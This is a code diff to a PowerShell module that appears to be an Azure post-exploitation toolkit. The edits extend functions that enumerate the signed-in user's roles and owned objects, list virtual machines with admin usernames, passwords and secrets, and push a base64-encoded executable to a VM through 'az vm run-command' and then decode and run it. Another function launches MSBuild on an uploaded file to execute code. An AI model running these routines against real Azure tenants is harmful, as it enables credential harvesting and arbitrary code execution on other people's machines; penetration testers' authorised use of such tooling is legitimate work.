@@ -893,20 +893,44 @@ function Get-CurrentUser
 <#
 .SYNOPSIS
     Returns the current logged in user name and any owned objects
+.PARAMETER
+    -all (Returns all raw details)
+.EXAMPLE
+    Get-CurrentUser
+	Get-CurrentUser -all
 #>
-    az ad signed-in-user show -o json | ConvertFrom-Json
-    $UID=az ad signed-in-user show --query 'userPrincipalName' -o tsv
-    Write-Host ""
-    az role assignment list --all --query "[?principalName=='$UID'].{Role:roleDefinitionName,Name:principalName,Type:principalType,ResourceGroup:resourceGroup}" -o table
-    Write-Host ""
-    Write-Host "Owned Objects:"
-    Write-Host ""
-    az ad signed-in-user list-owned-objects -o yaml
-    Write-Host ""
-    Write-Host "Subscriptions:"
-    Write-Host ""
-    az account list --query '[].{SubscriptionName:name,Id:id,TenantId:tenantId}' -o Table
-    
+		[CmdletBinding()]
+        Param(
+        [Parameter(Mandatory=$false)][Switch]$all = $null)
+	if($all)
+     {
+         az ad signed-in-user show -o json | ConvertFrom-Json  
+		 $UID=az ad signed-in-user show --query 'userPrincipalName' -o tsv
+		Write-Host ""
+		az role assignment list --all --query "[?principalName=='$UID'].{Role:roleDefinitionName,Name:principalName,Type:principalType,ResourceGroup:resourceGroup}" -o table
+		Write-Host ""
+		az role assignment list --all --query "[?principalName=='$UID'].{Scope:scope}" -o table
+		Write-Host ""
+		Write-Host "Owned Objects:"
+		Write-Host ""
+		az ad signed-in-user list-owned-objects -o yaml
+		Write-Host ""
+		az account list --query '[].{SubscriptionName:name,Id:id,TenantId:tenantId}' -o Table
+     }
+     else
+     {
+		$UID=az ad signed-in-user show --query 'userPrincipalName' -o tsv
+		Write-Host ""
+		az role assignment list --all --query "[?principalName=='$UID'].{Role:roleDefinitionName,Name:principalName,Type:principalType,ResourceGroup:resourceGroup}" -o table
+		Write-Host ""
+		az role assignment list --all --query "[?principalName=='$UID'].{Scope:scope}" -o table
+		Write-Host ""
+		Write-Host "Owned Objects:"
+		Write-Host ""
+		az ad signed-in-user list-owned-objects -o yaml
+		Write-Host ""
+		az account list --query '[].{SubscriptionName:name,Id:id,TenantId:tenantId}' -o Table
+    }
 }
 
 function Get-ServicePrincipals
@@ -1156,7 +1180,7 @@ function Get-StorageContents
      Param(
      [Parameter(Mandatory=$false)][String]$ResourceGroup = $null,
      [Parameter(Mandatory=$false)][String]$File = $null,
-     [Parameter(Mandatory=$false)][switch]$NoDelete = $null,
+     [Parameter(Mandatory=$false)][Switch]$NoDelete = $null,
      [Parameter(Mandatory=$false)][String]$StorageAccount = $null)
 
      If($ResourceGroup -eq "")
@@ -1362,10 +1386,14 @@ function Get-VMs
 .SYNOPSIS
     Lists all virtual machines available, their disks, and their IPs..
 #>
-    az vm list --query '[].{Name:name,AdminUserName:osProfile.adminUsername,AdminPassword:osProfile.adminPassword,Id:vmId,Secrets:secrets}' -o table
+    az vm list --query '[].{Name:name,AdminUserName:osProfile.adminUsername,AdminPassword:osProfile.adminPassword,OS:storageProfile.imageReference.offer,Secrets:secrets,ResourceGroup:resourceGroup,Id:vmId}' -o table
     Write-Host ""
-    az disk list --query '[].{Name:name,OS:osType,ResourceGroup:resourceGroup,SizeGB:diskSizeGb}' -o Table
-    Write-Host ""
+	Write-Host "VMs currently running"
+	Write-Host ""        
+	az vm list -d --query "[?powerState=='VM running'].name" -o tsv
+	Write-Host ""
+	Write-Host "VM IPs"
+	Write-Host ""     
     az vm list-ip-addresses -o table
     Write-Host ""
 }
@@ -1833,7 +1861,7 @@ function Execute-Program
                 $ByteArray = [System.IO.File]::ReadAllBytes($File)
                 $Base64String = [System.Convert]::ToBase64String($ByteArray) | Out-File temp.ps1 #This is necessary because raw output is too long for a command to be passed over az vm run-command invoke, so it must be in a script.
                 az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript --scripts "@temp.ps1" | Out-Null
-                $command = '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; $data = Get-Content C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.3\Downloads\$name ;$Decode = [System.Convert]::FromBase64String($data);[System.IO.File]::WriteAllBytes(""test.exe"",$Decode);C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.3\Downloads\test.exe'
+                $command = '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; $data = Get-Content C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\$name ;$Decode = [System.Convert]::FromBase64String($data);[System.IO.File]::WriteAllBytes(""test.exe"",$Decode);C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\test.exe'
                 az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript --scripts "$command"
             }
     }
@@ -1877,7 +1905,7 @@ function Execute-MSBuild
      else
      {
         az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript -o yaml --scripts @$File | Out-Null
-        az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript -o yaml --scripts "$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; Start-Process C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.3\Downloads\$name"
+        az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript -o yaml --scripts '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; Start-Process C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\$name'
      }
 }
 
